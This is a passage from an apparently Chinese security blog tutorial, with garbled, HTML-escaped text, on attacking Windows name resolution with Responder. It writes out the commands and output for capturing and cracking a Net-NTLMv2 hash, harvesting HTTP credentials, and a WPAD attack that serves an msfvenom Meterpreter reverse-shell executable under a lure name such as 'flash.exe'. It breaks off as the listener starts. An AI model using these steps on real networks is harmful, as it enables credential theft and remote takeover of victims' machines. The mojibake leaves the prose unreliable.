&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listening &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; events...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬åœ¨Windows 7ä¸­ä½¿ç”¨Win+ræ‰“å¼€è¿è¡Œçª—å£ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„ä¸»æœºåç§°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†å›æ¥å·²ç»èƒ½çœ‹åˆ°è·å–åˆ°äº†Net-NTLMv2ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…³äºNet-NTLMv2å’ŒLMçš„åŒºåˆ«å¯ä»¥çœ‹æ–‡ç« &lt;a href=&#34;https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4&#34;&gt;LM, NTLM, Net-NTLMv2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„Johnæ´»ç€hashcatå·¥å…·è¿›è¡Œç ´è§£,æˆ‘ä»¬æŠŠä¸‹é¢ä¸€æ®µä¿å­˜ä¸ºhash.txt:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sc92n::WIN-JH8N3KV3OQ0:75ca7c174829730d:7C8437661030E0EB8D762DCFC77CBE65:0101000000000000000C19E89C21D801B8B5060ABB05AFE600000000020008004400350033004A0001001E00570049004E002D004E004B0048004A00480050005600460045005000490004003400570049004E002D004E004B0048004A0048005000560046004500500049002E004400350033004A002E004C004F00430041004C00030014004400350033004A002E004C004F00430041004C00050014004400350033004A002E004C004F00430041004C0007000800000C19E89C21D80106000400020000000800300030000000000000000100000000200000C1802F43EEA3DDC3521CCF236AAF808F1A6C31366979710880AC8CED8547228D0A001000000000000000000000000000000000000900140063006900660073002F0078007800780061006100000000000000000000000000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹‹åæˆ‘ä»¬ä½¿ç”¨hashcatè¿›è¡Œç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ hashcat -m &lt;span class=&#34;m&#34;&gt;5600&lt;/span&gt; hash.txt passwd.txt                                                                                                                                                                                                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v6.1.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SC92N::WIN-JH8N3KV3OQ0:75ca7c174829730d:7c8437661030e0eb8d762dcfc77cbe65:0101000000000000000c19e89c21d801b8b5060abb05afe600000000020008004400350033004a0001001e00570049004e002d004e004b0048004a00480050005600460045005000490004003400570049004e002d004e004b0048004a0048005000560046004500500049002e004400350033004a002e004c004f00430041004c00030014004400350033004a002e004c004f00430041004c00050014004400350033004a002e004c004f00430041004c0007000800000c19e89c21d80106000400020000000800300030000000000000000100000000200000c1802f43eea3ddc3521ccf236aaf808f1a6c31366979710880ac8ced8547228d0a001000000000000000000000000000000000000900140063006900660073002f0078007800780061006100000000000000000000000000:p@ssw0rd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Session..........: hashcat
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Status...........: Cracked
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hash.Name........: NetNTLMv2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hash.Target......: SC92N::WIN-JH8N3KV3OQ0:75ca7c174829730d:7c843766103...000000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Time.Started.....: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:27 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Time.Estimated...: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:27 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;passwd.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Speed.#1.........:     &lt;span class=&#34;m&#34;&gt;1922&lt;/span&gt; H/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.01ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:1 Vec:16
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Progress.........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rejected.........: 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Restore.Point....: 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Candidates.#1....: p@ssw0rd -&amp;gt; p@ssw0rd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Started: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:26 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Stopped: Mon Feb &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 12:25:29 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è™½ç„¶è¿™ä¸ªæ–¹å¼å¾ˆéšè”½ï¼Œä½†æ˜¯å¦‚æœé‡åˆ°å¯†ç æ¯”è¾ƒå¼ºçš„å°±å¾ˆéš¾å—ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ•è·httpæ˜æ–‡&#34;&gt;æ•è·HTTPæ˜æ–‡&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨responderå·¥å…·æ˜¯å»è·å–HTTPçš„&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization&#34;&gt;Authorization&lt;/a&gt;ä¿¡æ¯ï¼Œä¸»è¦çš„æ–¹æ³•å°±æ˜¯å¼€å¯HTTPè®¤è¯çš„åŠŸèƒ½-bå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ sudo responder -I eth0 -fvb 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å»è¾“å…¥æœªéªŒè¯è¿‡çš„ç½‘å€å°±ä¼šå¼¹å‡ºéªŒè¯çª—å£ï¼Œè®©æˆ‘ä»¬è¾“å…¥å‡­è¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥åå°±å¯ä»¥åœ¨kaliä¸­çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„æ˜æ–‡ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æŸ¥çœ‹æµé‡ä¸­æ˜¯è·å–åˆ°äº†httpè®¤è¯çš„ä¿¡æ¯ï¼Œè§£å¯†base64å³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåŠŸèƒ½è¿˜æ˜¯ä¸é”™çš„ï¼Œå°±æ˜¯åŠ¨ä½œæ¯”è¾ƒæ˜æ˜¾ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å¦‚æœæœªèƒ½è·å–åˆ°æ˜æ–‡å‡­è¯å¯ä»¥å°è¯•é‡å¯ä¸‹å—å®³è€…çš„æœºå™¨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;åˆ©ç”¨wpadæ”»å‡»è·å–ç³»ç»Ÿæƒé™&#34;&gt;åˆ©ç”¨WPADæ”»å‡»è·å–ç³»ç»Ÿæƒé™&lt;/h2&gt;
&lt;p&gt;ç”¨æˆ·åœ¨è®¿é—®ç½‘é¡µæ—¶ï¼Œé¦–å…ˆä¼šæŸ¥è¯¢PACæ–‡ä»¶çš„ä½ç½®ï¼Œå…·ä½“æ–¹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1ã€é€šè¿‡DHCPæœåŠ¡å™¨&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¦‚å›¾&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://wooyun.js.org/images_result/images/201512071422587546237.png&#34; alt=&#34;è¿™é‡Œå†™å›¾ç‰‡æè¿°&#34;&gt;&lt;/p&gt;
&lt;p&gt;webæµè§ˆå™¨å‘DHCPæœåŠ¡å™¨å‘é€DHCP INFORMæŸ¥è¯¢PACæ–‡ä»¶ä½ç½®&lt;/p&gt;
&lt;p&gt;DHCPæœåŠ¡å™¨è¿”å›DHCP ACKæ•°æ®åŒ…ï¼ŒåŒ…å«PACæ–‡ä»¶ä½ç½®&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2ã€é€šè¿‡DNSæŸ¥è¯¢&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;webæµè§ˆå™¨å‘DNSæœåŠ¡å™¨å‘èµ· WPADï¼‹X çš„æŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;DNSæœåŠ¡å™¨è¿”å›æä¾›WPADä¸»æœºçš„IPåœ°å€&lt;/p&gt;
&lt;p&gt;webæµè§ˆå™¨é€šè¿‡è¯¥IPçš„80ç«¯å£ä¸‹è½½wpad.dat&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3ã€é€šè¿‡NBNSæŸ¥è¯¢&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Tipsï¼š&lt;/p&gt;
&lt;p&gt;Windows 2K , XP , 2K3 åªæ”¯æŒ DNS å’Œ NetBIOS&lt;/p&gt;
&lt;p&gt;Windows Vista ä¹‹åï¼ˆåŒ…æ‹¬ 2K8 ï¼Œ Win7ï¼ŒWin8.xï¼ŒWin 10ï¼‰æ”¯æŒDNSã€NBNSã€LLMNR&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚æœDHCPå’ŒDNSæœåŠ¡å™¨å‡æ²¡æœ‰å“åº”ï¼ŒåŒæ—¶å½“å‰ç¼“å­˜æ²¡æœ‰æ‰€è¯·æ±‚çš„ä¸»æœºåï¼Œå°±ä¼šå‘èµ·å¦‚ä¸‹åç§°è§£æï¼š&lt;/p&gt;
&lt;p&gt;å¦‚æœå½“å‰ç³»ç»Ÿæ”¯æŒLLMNRï¼ˆLink-Local Multicast Name Resolutionï¼‰ï¼Œå…ˆå‘èµ·å¹¿æ’­LLMNRæŸ¥è¯¢ï¼Œå¦‚æœæ²¡æœ‰å“åº”å†å‘èµ·å¹¿æ’­NBNSæŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;å¦‚æœæœ‰ä¸»æœºå›åº”PACæ–‡ä»¶ä½ç½®&lt;/p&gt;
&lt;p&gt;webæµè§ˆå™¨é€šè¿‡è¯¥IPçš„80ç«¯å£ä¸‹è½½wpad.dat&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œçš„å†…å®¹æ¥è‡ªäº&lt;a href=&#34;https://wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html&#34;&gt;
åŸºäºWPADçš„ä¸­é—´äººæ”»å‡»&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;WPADåŠŸèƒ½åœ¨ä¸Šé¢åšäº†ä»‹ç»ï¼Œä¸»è¦æ˜¯æ”»å‡»åŸç†å¦‚ä¸‹å›¾,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/9.jpeg&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆå»msfç”Ÿæˆä¸€ä¸ªexeæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f exe -o /usr/share/responder/files/filetoserve.exe 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå»ç¼–è¾‘responderçš„é…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶ä½ç½®åœ¨&lt;code&gt;/usr/share/responder/Responder.conf&lt;/code&gt;,ä¿®æ”¹ä¸‹é¢çš„é…ç½®ä¸ºOnï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[HTTP Server]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to On to always serve the custom EXE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serve-Always = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to On to replace any requested .exe with the custom EXE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serve-Exe = On 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to On to serve the custom HTML if the URL does not contain .exe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Set to Off to inject the &amp;#39;HTMLToInject&amp;#39; in web pages instead
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serve-Html = On 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨kaliæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo responder -I eth0 -wrfv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨msfä¸­æ‰§è¡Œç›‘å¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; windows/x64/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_https&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name      Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----      ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST     172.16.0.107     yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener hostname
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT     &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;               yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LURI                       no        The HTTP Path
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;lport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨å—å®³æœºçš„ç½‘é¡µä¸­è¾“å…¥åœ°å€ä¼šå¼¹å‡ºä¸‹è½½æ–‡ä»¶(å¯ä»¥ä¿®æ”¹ä¸€äº›æ¯”è¾ƒè¯±æƒ‘æ€§çš„ï¼Œæ¯”å¦‚flash.exeç­‰)ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°è®°å½•å·²ç»åœ¨å‘é€æ–‡ä»¶çš„æ•°æ®äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“å—å®³è€…æ‰§è¡Œexeåä¼šåå¼¹å›msfçš„shellï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
